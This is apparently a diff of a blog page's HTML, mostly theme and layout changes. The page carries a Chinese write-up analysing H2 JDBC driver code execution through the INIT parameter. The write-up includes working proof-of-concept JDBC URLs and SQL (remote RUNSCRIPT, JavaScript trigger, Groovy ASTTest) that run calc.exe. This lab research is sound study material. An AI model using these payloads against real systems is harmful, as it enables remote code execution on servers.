@@ -3,14 +3,28 @@
 <head>
   <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<meta name="theme-color" content="#f7f7f4">
-<meta name="color-scheme" content="light">
+<meta name="color-scheme" content="light dark">
+<meta name="theme-color" content="#f7f7f4" data-theme-color-light="#f7f7f4" data-theme-color-dark="#161614">
 
 <title>H2-JDBC-Attack — CurlySean&#39;s Blog</title>
 <meta name="description" content="这里是 CurlySean 的个人技术博客，记录漏洞研究、代码审计与攻防实践，整理可以复现、验证与继续推演的技术细节。">
-<link rel="canonical" href="http://curlysean.github.io/2025/08/15/H2-JDBC-Attack/">
+<link rel="canonical" href="https://curlysean.github.io/2025/08/15/H2-JDBC-Attack/">
+<link rel="preload" href="/fonts/instrument-sans-latin-wght-normal.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/jetbrains-mono-latin-wght-normal.woff2" as="font" type="font/woff2" crossorigin>
 <link rel="stylesheet" href="/css/style.css">
-<script>document.documentElement.classList.add('js')</script>
+<script>
+  (function () {
+    try {
+      var key = 'sheepfold-theme';
+      var saved = localStorage.getItem(key);
+      var dark = saved === 'dark' || (saved !== 'light' && window.matchMedia('(prefers-color-scheme: dark)').matches);
+      document.documentElement.setAttribute('data-theme', dark ? 'dark' : 'light');
+      document.documentElement.classList.add('js');
+    } catch (error) {
+      document.documentElement.classList.add('js');
+    }
+  })();
+</script>
 
 <meta name="generator" content="Hexo 7.3.0"></head>
 <body class="page-type-post">
@@ -37,11 +51,18 @@
         <a class="desktop-nav__link" href="/about/">关于</a>
       
     </nav>
-    <a class="header-cta" href="/archives/">开始阅读 <span aria-hidden="true">↗</span></a>
-    <button class="menu-toggle" type="button" aria-expanded="false" aria-controls="mobile-menu" data-menu-toggle>
-      <span class="sr-only">打开导航</span>
-      <span></span><span></span>
-    </button>
+    <div class="site-header__actions">
+      <button class="theme-toggle" type="button" data-theme-toggle aria-label="切换颜色模式" title="切换颜色模式">
+        <span data-theme-toggle-label>暗色</span>
+      </button>
+      
+        <a class="header-cta header-cta--ghost" href="/archives/">全部文章 <span aria-hidden="true">↗</span></a>
+      
+      <button class="menu-toggle" type="button" aria-expanded="false" aria-controls="mobile-menu" data-menu-toggle>
+        <span class="sr-only">打开导航</span>
+        <span></span><span></span>
+      </button>
+    </div>
   </div>
   <nav class="mobile-nav" id="mobile-menu" aria-label="移动端主导航" data-mobile-menu>
     <div class="frame mobile-nav__inner">
@@ -90,12 +111,6 @@
         
       </div>
     </div>
-    <div class="frame post-meta-grid reveal">
-      <div><span>发布</span><time datetime="2025-08-15T08:38:22.000Z">2025.08.15</time></div>
-      <div><span>更新</span><time datetime="2025-08-15T08:38:22.000Z">2025.08.15</time></div>
-      <div><span>阅读</span><strong>9 MIN</strong></div>
-      <div><span>标签</span><strong>1</strong></div>
-    </div>
   </header>
 
   <div class="frame post-content-layout">
@@ -103,13 +118,19 @@
       <div class="post-rail__inner">
         <p class="eyebrow">ON THIS PAGE</p>
         
-          <nav class="toc" aria-label="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pdg3I"><span class="toc-text">H2-JDBC-Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#BMzNu"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IB5SS"><span class="toc-text">漏洞介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#qHwg3"><span class="toc-text">前置基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#KfZyI"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sJWCh"><span class="toc-text">h2数据库任意命令执行</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#b0Yf9"><span class="toc-text">代码分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#OuhrW"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#X1sln"><span class="toc-text">代码分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MZutg"><span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#bpWvg"><span class="toc-text">出网利用方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#e1MeC"><span class="toc-text">不出网利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#fwgEP"><span class="toc-text">无额外依赖情况</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sFnH3"><span class="toc-text">存在Groovy依赖情况</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BLqDq"><span class="toc-text">小结</span></a></li></ol></li></ol></nav>
+          <nav class="toc" aria-label="文章目录"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#BMzNu"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IB5SS"><span class="toc-text">漏洞介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#qHwg3"><span class="toc-text">前置基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#KfZyI"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sJWCh"><span class="toc-text">h2数据库任意命令执行</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#b0Yf9"><span class="toc-text">代码分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#OuhrW"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#X1sln"><span class="toc-text">代码分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MZutg"><span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#bpWvg"><span class="toc-text">出网利用方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#e1MeC"><span class="toc-text">不出网利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#fwgEP"><span class="toc-text">无额外依赖情况</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sFnH3"><span class="toc-text">存在Groovy依赖情况</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BLqDq"><span class="toc-text">小结</span></a></li></ol></nav>
         
       </div>
     </aside>
     <div class="article-column">
+      <div class="post-meta-grid reveal">
+        <div><span>发布</span><time datetime="2025-08-15T08:38:22.000Z">2025.08.15</time></div>
+        <div><span>更新</span><time datetime="2025-08-15T08:38:22.000Z">2025.08.15</time></div>
+        <div><span>阅读</span><strong>约 4 分钟</strong></div>
+        <div><span>标签</span><strong>1</strong></div>
+      </div>
       <div class="article-body">
-        <h1 id="pdg3I">H2-JDBC-Attack</h1>
+        
 <h2 id="BMzNu">前言</h2>
 
 <p>最近看了看了一些数据库驱动，想起来经常利用的H2数据库的驱动，但是还没分析过源码，所以今天来浅析一下</p>
@@ -124,7 +145,7 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp h2-1.4.200.jar org.h2.tools.Server -web -webAllowOthers -ifNotExists</span><br></pre></td></tr></table></figure>
 
 <p>启动后访问，会出现一个连接的页面</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755241013648-89ec32f8-3a92-44d8-8392-0be10a98d354.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755241013648-89ec32f8-3a92-44d8-8392-0be10a98d354.png" alt="H2-JDBC-Attack" loading="lazy"></p>
 <h3 id="sJWCh">h2数据库任意命令执行</h3>
 
 <p>在H2数据库中，有以下两个命令，支持用户自定义函数：</p>
@@ -137,7 +158,7 @@
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> ALIAS shell <span class="keyword">AS</span> $$void shell(String s) throws Exception &#123;</span><br><span class="line">java.lang.Runtime.getRuntime().<span class="keyword">exec</span>(s);</span><br><span class="line">&#125;$$;</span><br><span class="line"><span class="keyword">SELECT</span> shell(<span class="string">&#x27;cmd /c calc.exe&#x27;</span>);</span><br></pre></td></tr></table></figure>
 
 <p>执行后成功弹出计算机</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755241709163-58306976-dcb0-42f5-a3a4-b860e2040492.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755241709163-58306976-dcb0-42f5-a3a4-b860e2040492.png" alt="H2-JDBC-Attack" loading="lazy"></p>
 <h2 id="b0Yf9">代码分析</h2>
 <h3 id="OuhrW">环境搭建</h3>
 
@@ -150,28 +171,28 @@
 <h3 id="X1sln">代码分析</h3>
 我们直接下断点到H2驱动的`connect`方法处，前面先判断URL格式是否符合h2数据库连接的格式，然后调用`JdbcConnection`的构造函数进行创建数据库连接
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755227935438-2d11acd1-6759-4fed-942c-3dd6d5e83b44.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755227935438-2d11acd1-6759-4fed-942c-3dd6d5e83b44.png" alt="H2-JDBC-Attack" loading="lazy"></p>
 <p>跟进<code>JdbcConnection</code>的构造函数，调用了<code>connectEmbeddedOrServer</code>，其他部分做了一些判断和赋值的简单操作</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755228213696-2f1146be-12e2-40c6-a2ac-d6e8161489db.png"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755228347105-ab9e0993-8197-406e-80b4-57d44c44b510.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755228213696-2f1146be-12e2-40c6-a2ac-d6e8161489db.png" alt="H2-JDBC-Attack" loading="lazy"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755228347105-ab9e0993-8197-406e-80b4-57d44c44b510.png" alt="H2-JDBC-Attack" loading="lazy"></p>
 <p>跟进<code>connectEmbeddedOrServer</code>方法，这里调用了<code>org.h2.engine.Engine.createSession</code>方法</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755228872145-a4fab2b6-4733-4ed0-93ec-53eae1540e3c.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755228872145-a4fab2b6-4733-4ed0-93ec-53eae1540e3c.png" alt="H2-JDBC-Attack" loading="lazy"></p>
 <p>跟进<code>createSession</code>，再跟进<code>createSessionAndValidate</code>方法，前面的东西不太需要看，我们只需要跟着传入的参数<code>var1</code>即可</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755229005496-63a86dff-2eb9-4fdb-96cc-5d2ae6a5c9c0.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755229005496-63a86dff-2eb9-4fdb-96cc-5d2ae6a5c9c0.png" alt="H2-JDBC-Attack" loading="lazy"></p>
 <p>跟进<code>openSession</code>中，会从我们的<code>ConnectionInfo</code>中获取以下四个参数，这里我们可以利用的参数为<code>INIT</code>，因此我们后面跟着var5参数即可</p>
 <p>我们在URL中添加INIT参数<code>INIT=RUNSCRIPT FROM &#39;http://127.0.0.1:9999/poc.sql&#39;</code>，继续调试</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755229236249-f50534d7-e446-40d6-8760-83d032518535.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755229236249-f50534d7-e446-40d6-8760-83d032518535.png" alt="H2-JDBC-Attack" loading="lazy"></p>
 <p>在后面会判断var5是否为空若不为空就执行<code>prepareCommand</code>和<code>executeUpdate</code>方法，这两个方法名一看见就有搞的哈哈哈哈</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755229351170-48df3e04-7b1d-4816-8f7b-435582ec9d99.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755229351170-48df3e04-7b1d-4816-8f7b-435582ec9d99.png" alt="H2-JDBC-Attack" loading="lazy"></p>
 <p>在<code>repareCommand</code>方法中，执行了对字符串的解析操作，然后调用<code>executeUpdate</code>方法，我们跟进查看</p>
 <p>解析完SQL字符串后，跟进到<code>Command#executeUpdate</code>方法，调用了<code>this.update</code>来执行SQL语句</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755230793457-9080ae19-06a2-4bc9-a1d7-b62162586c8b.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755230793457-9080ae19-06a2-4bc9-a1d7-b62162586c8b.png" alt="H2-JDBC-Attack" loading="lazy"></p>
 <p>持续跟进<code>update</code>方法，这里首先调用<code>openInput</code>方法，读取我们远程的SQL文件，然后逐行执行SQL语句</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755238775471-777d0fe8-09eb-4c9f-a376-7389609fac2a.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755238775471-777d0fe8-09eb-4c9f-a376-7389609fac2a.png" alt="H2-JDBC-Attack" loading="lazy"></p>
 <p>在<code>openInput</code>方法中，可以看到读取到了远程的文件名</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755238742298-0d9e4263-aa5b-49de-a8ff-8ed27e3f5ca5.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755238742298-0d9e4263-aa5b-49de-a8ff-8ed27e3f5ca5.png" alt="H2-JDBC-Attack" loading="lazy"></p>
 <p>跟进<code>execute</code>方法，这里已经读取到文件内容，并执行SQL语句</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755239078782-ecdce948-d0f3-41d7-92c2-23ef96dcc872.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755239078782-ecdce948-d0f3-41d7-92c2-23ef96dcc872.png" alt="H2-JDBC-Attack" loading="lazy"></p>
 <h2 id="MZutg">漏洞利用</h2>
 <h3 id="bpWvg">出网利用方式</h3>
 
@@ -184,7 +205,7 @@
 <p>将以下内容写入<code>poc.sql</code>中，并开启HTTP服务</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> ALIAS <span class="keyword">EXEC</span> <span class="keyword">AS</span> <span class="string">&#x27;String shellexec(String cmd) throws java.io.IOException&#123;Runtime.getRuntime().exec(cmd);return &quot;hacker&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">CALL</span> <span class="keyword">EXEC</span>(<span class="string">&#x27;calc&#x27;</span>)</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755243366363-aef263ca-6501-46eb-a21e-cd230f46a1db.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755243366363-aef263ca-6501-46eb-a21e-cd230f46a1db.png" alt="H2-JDBC-Attack" loading="lazy"></p>
 <h3 id="e1MeC">不出网利用方式</h3>
 
 <p>在不出网的情况下，我们就无法利用远程读取SQL文件来执行恶意SQL语句了</p>
@@ -193,19 +214,19 @@
 <p>在没有groovy依赖的情况下，我们该怎么进行不出网的利用呢。</p>
 <p>可以用于<code>javax.script.ScriptEngineManager</code>创建 <code>org.h2.api.Trigger</code> 对象。 <code>javax.script.ScriptEngineManager</code>是Java中用于执行脚本的引擎，而Java 8原 生自带了JavaScript的脚本引擎。</p>
 <p>在<code>TriggerObject#loadFromSource</code>方法中，调用<code>isJavaxScriptSource</code>方法判断是否为javascript脚本。如果以<code>//javascript</code>或<code>#ruby</code>开头，就会被当作javascript脚本</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755245781347-60067bf5-17d0-4760-95c2-481ba424ad32.png"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755245907981-a126794e-d33f-4204-97c1-eceeca324804.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755245781347-60067bf5-17d0-4760-95c2-481ba424ad32.png" alt="H2-JDBC-Attack" loading="lazy"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755245907981-a126794e-d33f-4204-97c1-eceeca324804.png" alt="H2-JDBC-Attack" loading="lazy"></p>
 <p>poc如下（需要注意<code>//script</code>后需要有个换行）</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON</span><br><span class="line">INFORMATION_SCHEMA.TABLES AS $$<span class="comment">//javascript</span></span><br><span class="line">java.lang.Runtime.getRuntime().exec(<span class="string">&#x27;cmd /c calc.exe&#x27;</span>)</span><br><span class="line">$$</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755246220565-2c6e8722-9362-4f6a-98cd-14ef76a12c02.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755246220565-2c6e8722-9362-4f6a-98cd-14ef76a12c02.png" alt="H2-JDBC-Attack" loading="lazy"></p>
 <h4 id="sFnH3">存在Groovy依赖情况</h4>
 在之前学习groovy脚本执行时，存在沙箱的情况下，我们可以使用AST注解绕过沙箱的检测，在导入`groovy-sql`依赖时，同样我们可以使用AST注解，进行H2JDBC不出网的利用
 
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.codehaus.groovy<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>groovy-sql<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.8<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>会根据是否以<code>//groovy</code>或<code>@groovy</code>开头，判断是否以groovy脚本执行</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755246427938-a7078c39-fba9-4b36-a650-7ee97cb36abe.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755246427938-a7078c39-fba9-4b36-a650-7ee97cb36abe.png" alt="H2-JDBC-Attack" loading="lazy"></p>
 <p>Poc如下</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE ALIAS shell2 AS</span><br><span class="line">$$<span class="meta">@groovy</span>.transform.ASTTest(value=&#123;</span><br><span class="line">    <span class="keyword">assert</span> java.lang.Runtime.getRuntime().exec(<span class="string">&quot;cmd.exe /c calc.exe&quot;</span>)</span><br><span class="line">&#125;)</span><br><span class="line">def x$$</span><br></pre></td></tr></table></figure>
 
@@ -227,13 +248,13 @@
   <nav class="frame post-navigation" aria-label="相邻文章">
     
       <a href="/2025/08/15/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/">
-        <span>← PREVIOUS</span>
+        <span>更新一篇</span>
         <strong>Redis未授权</strong>
       </a>
     
     
-      <a href="/2025/08/14/%E5%9F%BA%E4%BA%8ESqlServer%E7%9A%84SQL%E6%B3%A8%E5%85%A5/">
-        <span>NEXT →</span>
+      <a class="post-navigation__older" href="/2025/08/14/%E5%9F%BA%E4%BA%8ESqlServer%E7%9A%84SQL%E6%B3%A8%E5%85%A5/">
+        <span>更早一篇</span>
         <strong>基于SqlServer的SQL注入</strong>
       </a>
     
@@ -247,9 +268,9 @@
       <a href="/">CURLYSEAN</a>
       <span>持续记录，保持验证。</span>
     </div>
-    <p class="site-footer__copyright">© 2026 CurlySean</p>
+    <p class="site-footer__copyright">© 2025–2026 CurlySean</p>
     <nav class="site-footer__links" aria-label="外部链接">
-      <a href="https://github.com/CurlySean" target="_blank" rel="noopener">GitHub ↗</a>
+      <a href="https://github.com/CurlySean" target="_blank" rel="noopener noreferrer">GitHub ↗</a>
       <a href="mailto:5345414e@gmail.com">Email ↗</a>
     </nav>
   </div>
